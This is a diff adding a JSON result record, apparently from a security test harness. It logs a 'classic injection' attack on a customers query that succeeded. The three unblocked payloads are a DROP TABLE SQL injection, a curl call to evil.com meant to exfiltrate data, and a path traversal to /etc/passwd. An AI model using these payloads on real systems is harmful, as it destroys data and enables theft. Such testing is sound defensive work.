@@ -1,0 +1,32 @@
+{
+  "attack": "03_classic_injection",
+  "exploited": true,
+  "detail": {
+    "steps": [
+      {
+        "payload": "'; DROP TABLE customers; --",
+        "blocked": false,
+        "result": {
+          "sql_error": "You can only execute one statement at a time.",
+          "query": "SELECT * FROM customers WHERE id = ''; DROP TABLE customers; --'"
+        }
+      },
+      {
+        "payload": "$(curl evil.com/exfil)",
+        "blocked": false,
+        "result": {
+          "rows": [],
+          "query": "SELECT * FROM customers WHERE id = '$(curl evil.com/exfil)'"
+        }
+      },
+      {
+        "payload": "../../../../etc/passwd",
+        "blocked": false,
+        "result": {
+          "rows": [],
+          "query": "SELECT * FROM customers WHERE id = '../../../../etc/passwd'"
+        }
+      }
+    ]
+  }
+}
